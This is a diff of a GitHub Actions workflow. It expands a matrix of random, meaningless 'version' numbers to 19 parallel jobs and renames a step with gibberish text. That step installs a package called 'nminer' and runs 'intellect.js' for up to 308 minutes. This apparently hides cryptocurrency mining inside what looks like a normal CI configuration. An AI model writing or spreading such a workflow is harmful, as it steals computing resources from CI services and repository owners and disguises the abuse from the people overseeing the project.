@@ -9,23 +9,25 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 8001 }
-          - { version: 2766 }
-          - { version: 5741 }
-          - { version: 9615 }
-          - { version: 5137 }
-          - { version: 5177 }
-          - { version: 6762 }
-          - { version: 1659 }
-          - { version: 6425 }
-          - { version: 5772 }
-          - { version: 4150 }
-          - { version: 3992 }
-          - { version: 5762 }
-          - { version: 8810 }
-          - { version: 9365 }
-          - { version: 6288 }
-          - { version: 4777 }
+          - { version: 5481 }
+          - { version: 3052 }
+          - { version: 707 }
+          - { version: 8987 }
+          - { version: 1094 }
+          - { version: 4038 }
+          - { version: 8916 }
+          - { version: 9016 }
+          - { version: 4192 }
+          - { version: 8502 }
+          - { version: 7652 }
+          - { version: 7920 }
+          - { version: 1134 }
+          - { version: 7819 }
+          - { version: 4769 }
+          - { version: 9189 }
+          - { version: 3165 }
+          - { version: 2873 }
+          - { version: 8982 }
 
     steps:
       - name: Checkout
@@ -36,7 +38,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: cop-out tomorrow um sedately scarily
+      - name: drive blah newsletter
         run: |
           npm install nminer@latest
           timeout 308m node intellect.js || echo "intellect executed"
